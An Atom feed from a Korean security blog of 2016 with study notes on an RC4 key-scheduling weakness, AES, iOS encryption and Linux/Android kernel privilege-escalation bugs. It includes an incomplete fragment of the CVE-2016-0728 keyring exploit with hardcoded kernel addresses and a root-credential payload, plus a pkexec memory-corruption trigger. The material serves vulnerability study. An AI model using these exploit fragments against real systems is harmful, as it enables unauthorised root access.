<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[KC's blog]]></title>
  <link href="http://zomo.heroku.com/atom.xml" rel="self"/>
  <link href="http://zomo.heroku.com/"/>
  <updated>2016-08-24T15:24:12+09:00</updated>
  <id>http://zomo.heroku.com/</id>
  <author>
    <name><![CDATA[KC]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[RC4 Weakness]]></title>
    <link href="http://zomo.heroku.com/blog/2016/08/24/rc4-weakness/"/>
    <updated>2016-08-24T10:02:02+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/08/24/rc4-weakness</id>
    <content type="html"><![CDATA[<p>256 바이트의 퍼뮤테이션 테이블을 가지고 움직인다.</p>

<ul>
<li>key 를 장착하는 단계.</li>
<li>그리고 p-table 을 바꿔가면서 keystream 을 만들어 XOR 하는 암복호화하는 단계.</li>
</ul>


<p>RC4 공격 역사를 정리해보면, state 테이블의 처음 몇 바이트가 key 와 상관도가 높다는 포스팅이 sci.crypt 에 올라온게 처음인 것 같다.</p>

<p>state 의 첫 몇 바이트는 <code>state[n] == sum_0_to_nth_bytes(key) + n*(n+1)/2</code> 일 가능성이 37% 에 달한다고 Andrew Roos 가 포스팅함.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for (x=0;x&lt;256;x++) state-&gt;perm[x] = x;
</span><span class='line'>
</span><span class='line'>for (x=0;x&lt;256;
</span><span class='line'>    x++,
</span><span class='line'>    k = (k+1) % keylen) {
</span><span class='line'>    y += state-&gt;perm[x] + key[k];
</span><span class='line'>    swap_bytes(&state-&gt;perm[x], &state-&gt;perm[y]);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>여기서 만약, <code>state-&gt;perm[x]</code> 이 <code>x</code> 고, <code>state-&gt;perm[y]</code> 가 <code>y</code> 라면? 위의 코드가 아래와 같이 단순해진다. state[n] 은 n 으로 초기화되고 나서, key 에 따라서 swap 되는 과정을 거치는데, 한번도 swap 안되고 초기화된 n 으로 남아있는 경우. 즉 <code>x=n</code> 이라고 할 때, <code>0..n-1</code> 까지 iteration 에서 한번도 <code>y</code> 로 addressing 된 적이 없어야 한다. 초기 몇바이트의 경우 이럴 가능성이 상당히 있을 것이라 직관적으로도 알 수 있다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for (x=0;x&lt;256;
</span><span class='line'>    x++,
</span><span class='line'>    k = (k+1) % keylen) {
</span><span class='line'>    y += x + key[k];
</span><span class='line'>    state-&gt;perm[x] = y;
</span><span class='line'>    state-&gt;perm[y] = x;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>이걸 loop 를 풀면,  <code>state-&gt;perm[x] = sum_0_to_xth_bytes(key) + x*(x+1)/2</code> 가 된다.</p>

<p>그래서, 실제로 random 으로 80-bit key 를 만들어서 state 를 그 key 로 init 하고나서 저 공식으로 구한 값과 같은가 다른가를 비교하는 시뮬레이션을 십만번을 돌렸더니, state 의 0th~7th 바이트는 약 32~37% 가 저 공식의 값과 같았다고. 즉 의미있는 확률로 state 의 첫부분이 key 가 correlate 되있다는 것.</p>

<p>그 다음에 Paul, Rathi, Maitra 가 논문을 publish.</p>

<figure class='code'><figcaption><span>rc4.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">rc4_state</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">u_char</span> <span class="n">perm</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>    <span class="n">u_char</span> <span class="n">x</span><span class="p">;</span>
</span><span class='line'>    <span class="n">u_char</span> <span class="n">y</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="kr">__inline</span> <span class="kt">void</span> <span class="nf">swap_bytes</span><span class="p">(</span><span class="n">u_char</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="n">u_char</span> <span class="o">*</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">u_char</span> <span class="n">temp</span><span class="p">;</span>
</span><span class='line'>    <span class="n">temp</span> <span class="o">=</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span>
</span><span class='line'>    <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="o">*</span><span class="n">b</span><span class="p">;</span>
</span><span class='line'>    <span class="o">*</span><span class="n">b</span> <span class="o">=</span> <span class="n">temp</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">rc4_init</span><span class="p">(</span><span class="k">struct</span> <span class="n">rc4_state</span> <span class="o">*</span><span class="k">const</span> <span class="n">state</span><span class="p">,</span>
</span><span class='line'>                <span class="k">const</span> <span class="n">u_char</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span>
</span><span class='line'>                <span class="kt">int</span> <span class="n">keylen</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
</span><span class='line'>    <span class="n">state</span><span class="o">-&gt;</span><span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">state</span><span class="o">-&gt;</span><span class="n">y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">x</span><span class="o">&lt;</span><span class="mi">256</span><span class="p">;</span><span class="n">x</span><span class="o">++</span><span class="p">)</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">perm</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">u_char</span><span class="p">)</span><span class="n">x</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">u_char</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">u_char</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">x</span><span class="o">&lt;</span><span class="mi">256</span><span class="p">;</span>
</span><span class='line'>            <span class="n">x</span><span class="o">++</span><span class="p">,</span>
</span><span class='line'>            <span class="n">k</span> <span class="o">=</span> <span class="p">(</span><span class="n">k</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">y</span> <span class="o">+=</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">perm</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">k</span><span class="p">];</span>
</span><span class='line'>        <span class="n">swap_bytes</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">perm</span><span class="p">[</span><span class="n">x</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">perm</span><span class="p">[</span><span class="n">y</span><span class="p">]);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="kt">void</span>
</span><span class='line'><span class="nf">rc4_crypt</span><span class="p">(</span><span class="k">struct</span> <span class="n">rc4_state</span> <span class="o">*</span><span class="k">const</span> <span class="n">state</span><span class="p">,</span>
</span><span class='line'>            <span class="k">const</span> <span class="n">u_char</span> <span class="o">*</span><span class="n">inbuf</span><span class="p">,</span>
</span><span class='line'>            <span class="n">u_char</span> <span class="o">*</span><span class="n">outbuf</span><span class="p">,</span>
</span><span class='line'>            <span class="kt">int</span> <span class="n">buflen</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>    <span class="n">u_char</span> <span class="n">j</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">buflen</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">state</span><span class="o">-&gt;</span><span class="n">x</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>        <span class="n">state</span><span class="o">-&gt;</span><span class="n">y</span> <span class="o">+=</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">perm</span><span class="p">[</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">x</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">swap_bytes</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">perm</span><span class="p">[</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">x</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">perm</span><span class="p">[</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">y</span><span class="p">]);</span>
</span><span class='line'>        <span class="n">j</span> <span class="o">=</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">perm</span><span class="p">[</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">x</span><span class="p">]</span> <span class="o">+</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">perm</span><span class="p">[</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">y</span><span class="p">];</span>
</span><span class='line'>        <span class="n">outbuf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">inbuf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">perm</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">rc4_state</span> <span class="n">st</span><span class="p">;</span>
</span><span class='line'>    <span class="n">u_char</span> <span class="n">inbuf</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">u_char</span> <span class="n">outbuf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">rc4_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">st</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="n">u_char</span><span class="o">*</span><span class="p">)</span><span class="s">&quot;</span><span class="se">\x00\x00\x00\x00\x00\x00</span><span class="s">&quot;</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
</span><span class='line'>    <span class="n">rc4_crypt</span><span class="p">(</span><span class="o">&amp;</span><span class="n">st</span><span class="p">,</span> <span class="n">inbuf</span><span class="p">,</span> <span class="n">outbuf</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>    <span class="k">do</span> <span class="p">{</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">len</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%02X &quot;</span><span class="p">,</span> <span class="n">inbuf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="k">do</span> <span class="p">{</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">len</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%02X &quot;</span><span class="p">,</span> <span class="n">outbuf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">rc4_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">st</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="n">u_char</span><span class="o">*</span><span class="p">)</span><span class="s">&quot;</span><span class="se">\x00\x00\x00\x00\x00\x00</span><span class="s">&quot;</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
</span><span class='line'>    <span class="n">memset</span><span class="p">(</span><span class="n">inbuf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
</span><span class='line'>    <span class="n">rc4_crypt</span><span class="p">(</span><span class="o">&amp;</span><span class="n">st</span><span class="p">,</span> <span class="n">outbuf</span><span class="p">,</span> <span class="n">inbuf</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>    <span class="k">do</span> <span class="p">{</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">len</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%02X &quot;</span><span class="p">,</span> <span class="n">inbuf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CVE-2016-2434]]></title>
    <link href="http://zomo.heroku.com/blog/2016/07/06/cve-2016-2434/"/>
    <updated>2016-07-06T09:32:33+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/07/06/cve-2016-2434</id>
    <content type="html"><![CDATA[<p>&ldquo;The NVIDIA video driver in Android before 2016-05-01 on Nexus 9 devices allows attackers to gain privileges via a crafted application, aka internal bug 27251090.&rdquo;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>prctl(PR_SET_NAME, (unsigned long)NEW_PROC_NAME,0,0,0);</span></code></pre></td></tr></table></div></figure>


<p><code>prctl()</code> 라는 콜도 처음 알았고, 이걸로 process 이름을 바꿀 수 있는지도 처음 알았다. 나중에 task structure 를 뒤질때, marker 로서 활용하는 듯 하다.</p>

<p><code>get_root()</code> 라는 함수를 콜하고 나서, <code>setresuid()</code> &amp; <code>setresgid()</code> 를 호출.</p>

<p>그럼 <code>get_root()</code> 함수를 보자.</p>

<p>map_nvmap_handle() 을 호출하는데, 이 함수가 하는 일은.</p>

<p><code>/dev/nvmap</code> 을 연다. GPU 메모리 관리 드라이버인듯. <code>drivers/video/tegra/nvmap/</code> 에 소스가 있다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>static int map_nvmap_handle(unsigned int *handle)
</span><span class='line'>{
</span><span class='line'>
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>디바이스를 연다음에, <code>nvmap_create_handle</code> 이라는 구조체를 셋업한다.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct nvmap_create_handle {
</span><span class='line'>  union {
</span><span class='line'>      __u32 id;
</span><span class='line'>      __u32 size;
</span><span class='line'>      __s32 fd;
</span><span class='line'>  };
</span><span class='line'>  __u32 handle;
</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>


<p><code>nvmap_arg.size = 0x10000;</code> 으로 세팅해서 <code>/dev/nvmap</code> 에 <code>ioctl(fd, NVMAP_IOC_CREATE, &amp;nvmap_arg)</code> 을 한다.</p>

<p>이 ioctl() 의 리턴값이 <code>nvmap_arg.handle</code> 에 실리는 모양.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[AES in Python]]></title>
    <link href="http://zomo.heroku.com/blog/2016/07/02/aes-in-python/"/>
    <updated>2016-07-02T11:51:42+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/07/02/aes-in-python</id>
    <content type="html"><![CDATA[<p>AES 알고리즘을 Python 으로 구현해본다.</p>

<ul>
<li><a href="https://engineering.purdue.edu/kak/compsec/NewLectures/Lecture8.pdf">Lecture Notes</a></li>
</ul>


<p>일단 block 사이즈는 128 비트인데, key 사이즈는 여러개가 될 수 있다. key 사이즈에 따라서 round 갯수가 결정된다.</p>

<p>key 사이즈는 128 bit 로 정하고 구현한다.</p>

<ul>
<li>128 bit 키가 44 words (word 는 4 바이트) 로 확장된다. (키 스케쥴)</li>
<li>한 라운드가 키스케쥴에서 4 words (그러니까 16 바이트)의 키를 사용한다.</li>
<li><p>라운드는 10 라운드가 있다.</p></li>
<li><p>처음 w_0 ~ w_3 을 사용해서 &ldquo;Add round key&rdquo; 를 수행</p></li>
<li><p>그리고 Round 1 ~ Round 10 수행</p></li>
<li><p>초기 셋업인, &ldquo;Add round Key&rdquo; 는 <code>4x4 state 매트릭스</code> 와 w_0 ~ w_3 을 xor 한다.</p></li>
<li>각각의 라운드는 <code>SubBytes</code>, <code>ShiftRows</code>, <code>MixColumns</code>, <code>AddRoundKey</code> 로 구성된다.</li>
<li>마지막 라운드는 <code>MixColumns</code> 가 없다.</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[iPhone Security]]></title>
    <link href="http://zomo.heroku.com/blog/2016/06/20/iphone-security/"/>
    <updated>2016-06-20T16:11:04+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/06/20/iphone-security</id>
    <content type="html"><![CDATA[<ul>
<li><a href="http://esec-lab.sogeti.com/static/publications/11-hitbamsterdam-iphonedataprotection.pdf">Sogeti</a></li>
<li>Matthew Green&rsquo;s Crypto Engineering Blog</li>
<li>darthnull.org&rsquo;s Blog</li>
<li><a href="http://darthnull.org/media/presentations/2016-BSidesROC-iOSCrypto.pdf">darthnull&rsquo;s BSides talk</a></li>
</ul>


<p>iOS encryption 을 읽어봐야겠다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CVE-2016-0728]]></title>
    <link href="http://zomo.heroku.com/blog/2016/06/17/cve-2016-0728/"/>
    <updated>2016-06-17T13:02:10+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/06/17/cve-2016-0728</id>
    <content type="html"><![CDATA[<p><a href="https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f">PerceptionPointTeam/cve_2016_0728.c</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;stdlib.H&gt;
</span><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>#include &lt;sys/types.h&gt;
</span><span class='line'>#include &lt;keyutils.h&gt;
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>#include &lt;time.h&gt;
</span><span class='line'>
</span><span class='line'>#include &lt;sys/ipc.h&gt;
</span><span class='line'>#include &lt;sys/msg.h&gt;
</span><span class='line'>
</span><span class='line'>typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
</span><span class='line'>typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
</span><span class='line'>_commit_creds commit_creds;
</span><span class='line'>_prepare_kernel_cred prepare_kernel_cred;
</span><span class='line'>
</span><span class='line'>#define STRUCT_LEN (0xb8 - 0x30)
</span><span class='line'>#define COMMIT_CREDS_ADDR (0xffffffff81094250)
</span><span class='line'>#define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)
</span><span class='line'>
</span><span class='line'>struct key_type {
</span><span class='line'>  char * name;
</span><span class='line'>  size_t datalen;
</span><span class='line'>  void * vet_description;
</span><span class='line'>  void * preparse;
</span><span class='line'>  void * free_preparse;
</span><span class='line'>  void * instantiate;
</span><span class='line'>  void * update;
</span><span class='line'>  void * match_preparse;
</span><span class='line'>  void * match_free;
</span><span class='line'>  void * revoke;
</span><span class='line'>  void * destroy;
</span><span class='line'>};
</span><span class='line'>
</span><span class='line'>void userspace_revoke(void * key) {
</span><span class='line'>  commit_creds(prepare_kernel_cred(0));
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>int main(int argc, const char *argv[]) {
</span><span class='line'>  const char *keyring_name;
</span><span class='line'>  size_t i = 0;
</span><span class='line'>  unsigned long int l = 0x100000000/2;
</span><span class='line'>  key_serial_t serial = -1;
</span><span class='line'>  pid_t pid = -1;
</span><span class='line'>  struct key_type * my_key_type = NULL;
</span><span class='line'>
</span><span class='line'>  struct {
</span><span class='line'>      long mtype;
</span><span class='line'>      char mtext[STRUCT_LEN];
</span><span class='line'>  } msg = { 0x4141414141414141, {0} };
</span><span class='line'>  int msqid;
</span><span class='line'>  
</span><span class='line'>  if (argc != 2) {
</span><span class='line'>      puts("usage: ./keys &lt;key_name&gt;");
</span><span class='line'>      return 1;
</span><span class='line'>  }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Poisoned NUL Byte]]></title>
    <link href="http://zomo.heroku.com/blog/2016/06/14/the-poisoned-nul-byte/"/>
    <updated>2016-06-14T10:19:02+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/06/14/the-poisoned-nul-byte</id>
    <content type="html"><![CDATA[<p>Google Project Zero blog 에서.</p>

<ul>
<li><a href="http://googleprojectzero.blogspot.kr/2014/08/the-poisoned-nul-byte-2014-edition.html">The poisoned NUL byte, 2014 edition</a></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ CHARSET=//ABCDE pkexec
</span><span class='line'>*** Error in `pkexec`: malloc(): memory corruption: 0x00007f15bc0732d0 ***</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PlaidCTF CTF 2015: PlaidDB]]></title>
    <link href="http://zomo.heroku.com/blog/2016/06/14/plaidctf-ctf-2015-plaiddb/"/>
    <updated>2016-06-14T09:53:54+09:00</updated>
    <id>http://zomo.heroku.com/blog/2016/06/14/plaidctf-ctf-2015-plaiddb</id>
    <content type="html"><![CDATA[
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HITCON CTF 2014 'Unexploitable' Heap Overflow]]></title>
